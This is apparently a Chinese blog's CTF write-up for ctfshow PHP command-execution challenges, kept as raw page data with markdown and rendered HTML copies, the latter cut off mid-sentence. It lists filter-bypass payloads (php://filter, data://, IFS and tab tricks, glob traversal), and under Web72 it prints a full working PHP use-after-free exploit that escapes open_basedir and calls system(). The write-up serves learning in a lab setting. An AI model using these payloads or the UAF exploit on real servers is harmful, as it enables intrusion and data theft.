所以不能像上一题用文件上传\r\n\r\n> 这道题表达flag在36.php 而在system函数中也有cat和.php 只需要传参c=36就行了\r\n\r\n> ```\r\n> 在Linux shell中$(())是代表数学运算   ~代表取反    举个栗子：a=1,b=2\r\n> $a+$b就等同于$((1+2))\r\n> ```\r\n>\r\n> \r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002659.gif)\r\n\r\n> 一个很奇怪的点 -1取反再输出是显示的0 要得到一就要在加一个$((~$(())))\r\n\r\n> 所以要输出36 需要37个\r\n>\r\n> ```\r\n> $((~$(())))\r\n> ```\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002671.gif)\r\n\r\n \r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002039.gif)\r\n\r\n### Web58\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002184.gif)\r\n\r\n> 只能一个一个试过去\r\n\r\n![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image018.gif)\r\n\r\n> 直接读文件\r\n\r\n### Web59\r\n\r\n> 跟上题一样，啥也不知道\r\n\r\n![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image020.gif)\r\n\r\n> 还是直接读就读出来了\r\n\r\n![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image022.gif)\r\n\r\n### Web60\r\n\r\n![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image024.gif)\r\n\r\n![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image026.gif)\r\n\r\n### Web61 62\r\n\r\n> 还是和上一题一样的\r\n\r\n### Web66\r\n\r\n![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image028.gif)\r\n\r\n> 查看目录\r\n\r\n![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image030.gif)\r\n\r\n> Print_r和var_dump 作用差不多可以替换\r\n\r\n> 2.var_dump()和print_r()的区别\r\n\r\n> 共同点：两者都可以打印数组，对象之类的复合型变量。\r\n\r\n> 区别：print_r() 只能打印一些易于理解的信息，且print_r()在打印数组时，会将把数组的指针移到最后边，使用 reset() 可让指针回到开始处。 而var_dump()不但能打印复合类型的数据，还能打印资源类型的变量。且var_dump()输出的信息则比较详细，一般调试时用得多。\r\n\r\n![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image032.gif)\r\n\r\n### Web67\r\n\r\n> 和上一题一样\r\n\r\n### Web68\r\n\r\n![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image034.gif)\r\n\r\n> 常规查目录\r\n\r\n![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image036.gif)\r\n\r\n> 这次禁用了show_source 和highlingt_file\r\n\r\n> 用include![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image038.gif)\r\n\r\n \r\n\r\n> 然后就RCE\r\n\r\n### Web70\r\n\r\n> Var_dump print_r被禁 还可以使用var_export\r\n\r\n> var_export() 函数用于输出或返回一个变量，以字符串形式表示。\r\n\r\n> var_export() 函数返回关于传递给该函数的变量的结构信息，它和 var_dump() 类似，不同的是其返回的是一个合法的 PHP 代码。\r\n\r\n![image-20230530202004081](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020137.png)\r\n\r\n> 还是一样include方法做\r\n\r\n### Web71\r\n\r\n![image-20230530203443557](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302034605.png)\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020667.gif)\r\n\r\n> [PHP详解ob_clean,ob_start和ob_get_contents函数](https://blog.csdn.net/weixin_34214500/article/details/85920870?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.pc_relevant_default&utm_relevant_index=2)\r\n\r\n> 这道题是先将缓冲区的内容存在s变量中，然后执行清空缓冲区可以忽略前面所有输出，再通过替换输出s变量形成看到的题目。\r\n\r\n> 可以用exit（）直接终端进程\r\n\r\n![image-20230530203500613](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302035672.png)\r\n\r\n\r\n\r\n### Web72![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020669.gif)\r\n\r\n> 无权限  用glob伪协议遍历目录 (通用版)\r\n\r\n```\r\nc=$a="glob:///*.txt";\r\nif($b=opendir($a)){\r\n\twhile(($a=readdir($b))!==false){\r\n\techo "filename:".$a."\\n";\r\n}\r\nclosedir($b);\r\n}\r\nexit();\r\n或者\r\nc=?><?php $a=new DirectoryIterator("glob://./*");\r\nforeach($a as $f)\r\n{echo($f->__toString().\' \');\r\n}\r\nexit(0);\r\n?>\r\n```\r\n\r\n> 然后利用uaf漏洞来读取 \r\n\r\n> 看了关于uaf漏洞的笔记：[漏洞学习笔记——UAF漏洞_孤月丶星辰的博客-CSDN博客_uaf漏洞](https://blog.csdn.net/musilintan/article/details/116309734?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-116309734-blog-108921661.pc_relevant_paycolumn_v3&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-116309734-blog-108921661.pc_relevant_paycolumn_v3&utm_relevant_index=1)\r\n\r\n> uaf绕过open_basedir执行命令\r\n> poc（需要url编码）\r\n>\r\n> ```\r\n> <?php\r\n> \r\n> function ctfshow($cmd) {\r\n>     global $abc, $helper, $backtrace;\r\n> \r\n> class Vuln {\r\n>     public $a;\r\n>     public function __destruct() { \r\n>         global $backtrace; \r\n>         unset($this->a);\r\n>         $backtrace = (new Exception)->getTrace();\r\n>         if(!isset($backtrace[1][\'args\'])) {\r\n>             $backtrace = debug_backtrace();\r\n>         }\r\n>     }\r\n> }\r\n> \r\n> class Helper {\r\n>     public $a, $b, $c, $d;\r\n> }\r\n> \r\n> function str2ptr(&$str, $p = 0, $s = 8) {\r\n>     $address = 0;\r\n>     for($j = $s-1; $j >= 0; $j--) {\r\n>         $address <<= 8;\r\n>         $address |= ord($str[$p+$j]);\r\n>     }\r\n>     return $address;\r\n> }\r\n> \r\n> function ptr2str($ptr, $m = 8) {\r\n>     $out = "";\r\n>     for ($i=0; $i < $m; $i++) {\r\n>         $out .= sprintf("%c",($ptr & 0xff));\r\n>         $ptr >>= 8;\r\n>     }\r\n>     return $out;\r\n> }\r\n> \r\n> function write(&$str, $p, $v, $n = 8) {\r\n>     $i = 0;\r\n>     for($i = 0; $i < $n; $i++) {\r\n>         $str[$p + $i] = sprintf("%c",($v & 0xff));\r\n>         $v >>= 8;\r\n>     }\r\n> }\r\n> \r\n> function leak($addr, $p = 0, $s = 8) {\r\n>     global $abc, $helper;\r\n>     write($abc, 0x68, $addr + $p - 0x10);\r\n>     $leak = strlen($helper->a);\r\n>     if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\r\n>     return $leak;\r\n> }\r\n> \r\n> function parse_elf($base) {\r\n>     $e_type = leak($base, 0x10, 2);\r\n> \r\n> ​    $e_phoff = leak($base, 0x20);\r\n> ​    $e_phentsize = leak($base, 0x36, 2);\r\n> ​    $e_phnum = leak($base, 0x38, 2);\r\n> \r\n> ​    for($i = 0; $i < $e_phnum; $i++) {\r\n> ​        $header = $base + $e_phoff + $i * $e_phentsize;\r\n> ​        $p_type  = leak($header, 0, 4);\r\n> ​        $p_flags = leak($header, 4, 4);\r\n> ​        $p_vaddr = leak($header, 0x10);\r\n> ​        $p_memsz = leak($header, 0x28);\r\n> \r\n> ​        if($p_type == 1 && $p_flags == 6) { \r\n> \r\n> ​            $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\r\n> ​            $data_size = $p_memsz;\r\n> ​        } else if($p_type == 1 && $p_flags == 5) { \r\n> ​            $text_size = $p_memsz;\r\n> ​        }\r\n> ​    }\r\n> \r\n> ​    if(!$data_addr || !$text_size || !$data_size)\r\n> ​        return false;\r\n> \r\n> ​    return [$data_addr, $text_size, $data_size];\r\n> }\r\n> \r\n> function get_basic_funcs($base, $elf) {\r\n>     list($data_addr, $text_size, $data_size) = $elf;\r\n>     for($i = 0; $i < $data_size / 8; $i++) {\r\n>         $leak = leak($data_addr, $i * 8);\r\n>         if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\r\n>             $deref = leak($leak);\r\n>             \r\n>             if($deref != 0x746e6174736e6f63)\r\n>                 continue;\r\n>         } else continue;\r\n> \r\n> ​        $leak = leak($data_addr, ($i + 4) * 8);\r\n> ​        if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\r\n> ​            $deref = leak($leak);\r\n> ​            \r\n> ​            if($deref != 0x786568326e6962)\r\n> ​                continue;\r\n> ​        } else continue;\r\n> \r\n> ​        return $data_addr + $i * 8;\r\n> ​    }\r\n> }\r\n> \r\n> function get_binary_base($binary_leak) {\r\n>     $base = 0;\r\n>     $start = $binary_leak & 0xfffffffffffff000;\r\n>     for($i = 0; $i < 0x1000; $i++) {\r\n>         $addr = $start - 0x1000 * $i;\r\n>         $leak = leak($addr, 0, 7);\r\n>         if($leak == 0x10102464c457f) {\r\n>             return $addr;\r\n>         }\r\n>     }\r\n> }\r\n> \r\n> function get_system($basic_funcs) {\r\n>     $addr = $basic_funcs;\r\n>     do {\r\n>         $f_entry = leak($addr);\r\n>         $f_name = leak($f_entry, 0, 6);\r\n> \r\n> ​        if($f_name == 0x6d6574737973) {\r\n> ​            return leak($addr + 8);\r\n> ​        }\r\n> ​        $addr += 0x20;\r\n> ​    } while($f_entry != 0);\r\n> ​    return false;\r\n> }\r\n> \r\n> function trigger_uaf($arg) {\r\n> \r\n> ​    $arg = str_shuffle(\'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\');\r\n> ​    $vuln = new Vuln();\r\n> ​    $vuln->a = $arg;\r\n> }\r\n> \r\n> if(stristr(PHP_OS, \'WIN\')) {\r\n>     die(\'This PoC is for *nix systems only.\');\r\n> }\r\n> \r\n> $n_alloc = 10; \r\n> $contiguous = [];\r\n> for($i = 0; $i < $n_alloc; $i++)\r\n>     $contiguous[] = str_shuffle(\'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\');\r\n> \r\n> trigger_uaf(\'x\');\r\n> $abc = $backtrace[1][\'args\'][0];\r\n> \r\n> $helper = new Helper;\r\n> $helper->b = function ($x) { };\r\n> \r\n> if(strlen($abc) == 79 || strlen($abc) == 0) {\r\n>     die("UAF failed");\r\n> }\r\n> \r\n> $closure_handlers = str2ptr($abc, 0);\r\n> $php_heap = str2ptr($abc, 0x58);\r\n> $abc_addr = $php_heap - 0xc8;\r\n> \r\n> write($abc, 0x60, 2);\r\n> write($abc, 0x70, 6);\r\n> \r\n> write($abc, 0x10, $abc_addr + 0x60);\r\n> write($abc, 0x18, 0xa);\r\n> \r\n> $closure_obj = str2ptr($abc, 0x20);\r\n> \r\n> $binary_leak = leak($closure_handlers, 8);\r\n> if(!($base = get_binary_base($binary_leak))) {\r\n>     die("Couldn\'t determine binary base address");\r\n> }\r\n> \r\n> if(!($elf = parse_elf($base))) {\r\n>     die("Couldn\'t parse ELF header");\r\n> }\r\n> \r\n> if(!($basic_funcs = get_basic_funcs($base, $elf))) {\r\n>     die("Couldn\'t get basic_functions address");\r\n> }\r\n> \r\n> if(!($zif_system = get_system($basic_funcs))) {\r\n>     die("Couldn\'t get zif_system address");\r\n> }\r\n> \r\n> $fake_obj_offset = 0xd0;\r\n> for($i = 0; $i < 0x110; $i += 8) {\r\n>     write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\r\n> }\r\n> \r\n> write($abc, 0x20, $abc_addr + $fake_obj_offset);\r\n> write($abc, 0xd0 + 0x38, 1, 4); \r\n> write($abc, 0xd0 + 0x68, $zif_system); \r\n> \r\n> ($helper->b)($cmd);\r\n> exit();\r\n> \r\n> }\r\n> \r\n> ctfshow("cat /flag0.txt");ob_end_flush();\r\n> ?>\r\n> ```\r\n>\r\n> \r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020682.gif)\r\n\r\n### Web73\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020884.gif)\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020022.gif)\r\n\r\n> 还是glob遍历\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020067.gif)\r\n\r\n用上脚本发现strlen被ban了\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020097.gif)\r\n\r\n> 看其他师傅的wp include是没有被ban掉的 做题定向思维了 这应该是非预期解了\r\n\r\n### Web74\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020282.gif) \r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020339.gif)\r\n\r\n> 和上一题一样\r\n\r\n### Web75\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020432.gif)\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020507.gif)\r\n\r\n> 这道题是用了pdo连接mysql操作方法 不是特别明白 先跳过\r\n\r\n',contentRendered:'<h2 id="命令执行" tabindex="-1"><a class="header-anchor" href="#命令执行" aria-hidden="true">#</a> 命令执行</h2>\n<h3 id="web29-37" tabindex="-1"><a class="header-anchor" href="#web29-37" aria-hidden="true">#</a> Web29-37</h3>\n<blockquote>\n<p>都使用get传参，</p>\n</blockquote>\n<blockquote>\n<p>根据被屏蔽的字词的不同考虑不同的解法</p>\n<p>（1）system（“”）；执行一系列查看文件操作</p>\n<p>（2）都可以一把梭 如果只对get的参数c进行限制 用eval（$_GET[]）来进行参数逃逸   如果（）被过滤可以考虑使用结构语言 include require print echo inset unset</p>\n</blockquote>\n<blockquote>\n<p>常用Payload   ?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</p>\n</blockquote>\n<blockquote>\n<p>Filter伪协议 常用于读取文件/源码</p>\n</blockquote>\n<h3 id="web39" tabindex="-1"><a class="header-anchor" href="#web39" aria-hidden="true">#</a> Web39</h3>\n<blockquote>\n<p>使用了include文件包含，使用伪协议date 使后面的语句不是当成字符串类型，可以当成php语句被执行</p>\n</blockquote>\n<blockquote>\n<p>短标签就是把&lt;?php 换成&lt;?=  前提是这个功能打开</p>\n</blockquote>\n<blockquote>\n<p>Payload</p>\n<div class="language-php ext-php line-numbers-mode"><pre v-pre class="language-php"><code>?c=data://text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span>“tac f<span class="token operator">*</span>”<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br></div></div><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301424026.png" alt="image-20230530142400973" style="zoom: 50%;" />\n</blockquote>\n<h3 id="web40" tabindex="-1"><a class="header-anchor" href="#web40" aria-hidden="true">#</a> Web40</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230530153304420" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301533464.png" data="aurora"></p>\n<blockquote>\n<p><strong>RCE无参数</strong></p>\n</blockquote>\n<blockquote>\n<p>localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</p>\n</blockquote>\n<blockquote>\n<p>scandir()：获取目录下的文件，scandir(.)：获取当前目录下所有文件</p>\n</blockquote>\n<blockquote>\n<p>pos()：返回数组中的当前元素的值。</p>\n</blockquote>\n<blockquote>\n<p>array_reverse()：数组逆序</p>\n</blockquote>\n<blockquote>\n<p>next()： 函数将内部指针指向数组中的下一个元素，并输出。</p>\n</blockquote>\n<blockquote>\n<p>highlight_file()：函数进行文件内容的读取，并输出(也可用show_source)</p>\n</blockquote>\n <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301850412.png" alt="image-20230530185039088" style="zoom: 50%;" />\n<blockquote>\n<p>show_source(next(array_reverse(scandir(pos(localeconv())))));</p>\n</blockquote>\n<blockquote>\n<p>?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p>\n</blockquote>\n <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301534285.png" alt="image-20230530153424249" style="zoom:50%;" />\n<h3 id="web43" tabindex="-1"><a class="header-anchor" href="#web43" aria-hidden="true">#</a> Web43<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932136.gif" alt="img"  /></h3>\n<blockquote>\n<p>代码中插入了&gt;/dev/null 2&gt;&amp;1，“&gt;/dev/null 2&gt;&amp;1”的作用就是不回显。</p>\n</blockquote>\n<blockquote>\n<p>（分隔符进行分割绕过）这道题和上一题差不多，不一样的是屏蔽了；可以用%0a绕过或者(%26%26)&amp;&amp;或者(%27%27)||绕过</p>\n</blockquote>\n<blockquote>\n<p>不是很明白的一个点&amp;&amp;需要url编码 但是||却不要  原因：在URL内的所有不安全的字符必须被编码。保留的，预留的(Reserved)：许多URL方案为特殊的意义保留了某些字符：它们在部分URL指定方案中出现。如果相应八字节的字符是方案内部的保留字，那它必须被编码。字符; , / , ? , : , @ , = &amp;可能被某个方案预留用作特殊意义。在其他方案中不能保留其他字符。当一个八字节由一个字符表示并且被编码时，URL通常具有相同的解释。 但是，对于保留字符而言，这不是真的：编码一个为特定方案保留的字符可能会改变URL的语义。因此，在URL中数字、字母、特殊字符$ -_。+！*()以及保留字符要经过解码(unencoded)后才使用。另一方面，只要它们不用于保留目的，可以在URL指定方案中编码不需要编码的字符（包括字母数字）。</p>\n</blockquote>\n<blockquote>\n<p>Payload：?c=tac f*||</p>\n</blockquote>\n<h3 id="web44" tabindex="-1"><a class="header-anchor" href="#web44" aria-hidden="true">#</a> Web44</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932183.gif" data="aurora"></p>\n<blockquote>\n<p>跟上面一题一样 多了过滤flag 用通配符就行</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932182.gif" data="aurora"></p>\n<h3 id="web45" tabindex="-1"><a class="header-anchor" href="#web45" aria-hidden="true">#</a> Web45</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932180.gif" data="aurora"></p>\n<blockquote>\n<p>没什么特别的多了过滤空格常见方法如下</p>\n</blockquote>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>%09（url传递）  表示的是tab (cat%09flag.php)\n${IFS}\n$IFS$9\n&lt;>（cat&lt;>flag）\n&lt;（cat&lt;flag）\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><blockquote>\n<p>{cat,flag}原理参考：https://blog.csdn.net/m0_56059226/article/details/117997472</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932177.gif" data="aurora"></p>\n<h3 id="web46" tabindex="-1"><a class="header-anchor" href="#web46" aria-hidden="true">#</a> Web46<img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932197.gif" data="aurora"></h3>\n<blockquote>\n<p>过滤多了数字 由于%09(tab)绕过空格解码后代表的是tab不属于数字不会被过滤</p>\n</blockquote>\n<blockquote>\n<p>过滤了$ $$$所以不能用${IFS}绕过空格</p>\n</blockquote>\n<blockquote>\n<p>沿用上一题的payload就行</p>\n</blockquote>\n<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932854.gif" alt="img" style="zoom: 80%;" />\n<h3 id="web47" tabindex="-1"><a class="header-anchor" href="#web47" aria-hidden="true">#</a> Web47</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932883.gif" data="aurora"></p>\n<blockquote>\n<p>过滤了more less 等查看文件的命令 （more:一页一页的显示档案内容</p>\n</blockquote>\n<blockquote>\n<p>less:与 more 类似</p>\n</blockquote>\n<blockquote>\n<p>head:查看头几行</p>\n</blockquote>\n<blockquote>\n<p>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</p>\n</blockquote>\n<blockquote>\n<p>tail:查看尾几行</p>\n</blockquote>\n<blockquote>\n<p>nl：显示的时候，顺便输出行号</p>\n</blockquote>\n<blockquote>\n<p>od:以二进制的方式读取档案内容</p>\n</blockquote>\n<blockquote>\n<p>vi:一种编辑器，这个也可以查看</p>\n</blockquote>\n<blockquote>\n<p>vim:一种编辑器，这个也可以查看</p>\n</blockquote>\n<blockquote>\n<p>sort:可以查看</p>\n</blockquote>\n<blockquote>\n<p>uniq:可以查看</p>\n</blockquote>\n<blockquote>\n<p>file -f:报错出具体内容）还是一样用tac没什么好说的</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932941.gif" data="aurora"></p>\n<h3 id="web48" tabindex="-1"><a class="header-anchor" href="#web48" aria-hidden="true">#</a> Web48</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932045.gif" data="aurora"></p>\n<blockquote>\n<p>还是过滤多了sed cut等Linux命令</p>\n</blockquote>\n<blockquote>\n<p>用上一题payload</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932120.gif" data="aurora"></p>\n<h3 id="web49" tabindex="-1"><a class="header-anchor" href="#web49" aria-hidden="true">#</a> Web49</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932159.gif" data="aurora"></p>\n<blockquote>\n<p>多了% 不过跟题目没啥关系 沿用上题payload</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932249.gif" data="aurora"></p>\n<h3 id="web50" tabindex="-1"><a class="header-anchor" href="#web50" aria-hidden="true">#</a> Web50</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932321.gif" data="aurora"></p>\n<blockquote>\n<p>过滤了&amp;（%26）和tab（%09） 一样啊 用&lt;绕过空格</p>\n</blockquote>\n<blockquote>\n<p>但是不能用？通配符 ？？？</p>\n</blockquote>\n<blockquote>\n<p>利用shall特性用’’或者””或者\\隔开被过滤的字符串(原理：还有一个小知识，之前我在纠结为什么ca\\t或者c\\at的效果和cat一样，后来经过东拼西凑的问大佬和尝试，最后总结的原因是因为在linux里面当转义符号()转义普通字符的时候，和普通字符原来的效果是一样的，意思就是\\t和t都是t，只有在转义特殊字符的时候，才起了作用，比如$，$则不再表示变量的意思。)</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932459.gif" data="aurora"></p>\n<h3 id="web51" tabindex="-1"><a class="header-anchor" href="#web51" aria-hidden="true">#</a> Web51</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932519.gif" data="aurora"></p>\n<blockquote>\n<p>多过滤了tac 换个nl继续用</p>\n</blockquote>\n<blockquote>\n<p>或者继续ta\\c</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932556.gif" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932584.gif" data="aurora"></p>\n<h3 id="web52" tabindex="-1"><a class="header-anchor" href="#web52" aria-hidden="true">#</a> Web52</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932748.gif" data="aurora"></p>\n<blockquote>\n<p>常规去做 发现过滤了上一题的&lt;&gt; 有点惯性思维去找其他解题方法 没有看见没有过滤$</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932787.gif" data="aurora"></p>\n<blockquote>\n<p>发现被耍了 这个flag.php中不是答案</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932833.gif" data="aurora"></p>\n<blockquote>\n<p>查看根目录下的文件夹 发现是有flag这个文件的 有两个想法 一个是直接读取里面的文件，一个是把flag复制到当前文件夹中</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932977.gif" data="aurora"></p>\n<blockquote>\n<p>二可行</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932039.gif" data="aurora"></p>\n<blockquote>\n<p>查看一下flag这个文件的权限有rx，应该是可以读</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932154.gif" data="aurora"></p>\n<h3 id="web53" tabindex="-1"><a class="header-anchor" href="#web53" aria-hidden="true">#</a> Web53</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932289.gif" data="aurora"></p>\n<blockquote>\n<p>看了一下是echo函数 然后多了变量d后会system$c</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932337.gif" data="aurora"></p>\n<blockquote>\n<p>常规看一下文件内容 有flag.php 直接看</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932487.gif" data="aurora"></p>\n<h3 id="web54" tabindex="-1"><a class="header-anchor" href="#web54" aria-hidden="true">#</a> Web54</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932592.gif" data="aurora"></p>\n<blockquote>\n<p>在正则中 .*c.*a.*t.*相当于cat中不能穿插任何字符了，所以不能用’’绕过 考虑用mv对文件重命名</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932758.gif" data="aurora"></p>\n<h3 id="web55" tabindex="-1"><a class="header-anchor" href="#web55" aria-hidden="true">#</a> Web55</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932832.gif" data="aurora"></p>\n<blockquote>\n<p>过滤了所有字母,查了资料 有两种解法 一种是通过执行的上传文件 另一种是通过/bin/base64输出flag</p>\n</blockquote>\n<blockquote>\n<p>第二种方法试了下发现不能用</p>\n</blockquote>\n<blockquote>\n<p>仔细研究了p神的文章https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</p>\n</blockquote>\n<blockquote>\n<p>具体方法：。.或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则. file的意思就是用bash执行file文件中的命令。（1. &quot; ./ “ 的方式类似于新建了一个shell， 在这个新建的shell中去执行脚本中的程序，类似于新建了一个子进程，但这个子进程不继承父进程的所有非export类型的变量，并且脚本中对非export环境变量的创建或修改不会反馈到外部调用shell中</p>\n</blockquote>\n<blockquote>\n<p>\\2. ” . &quot; 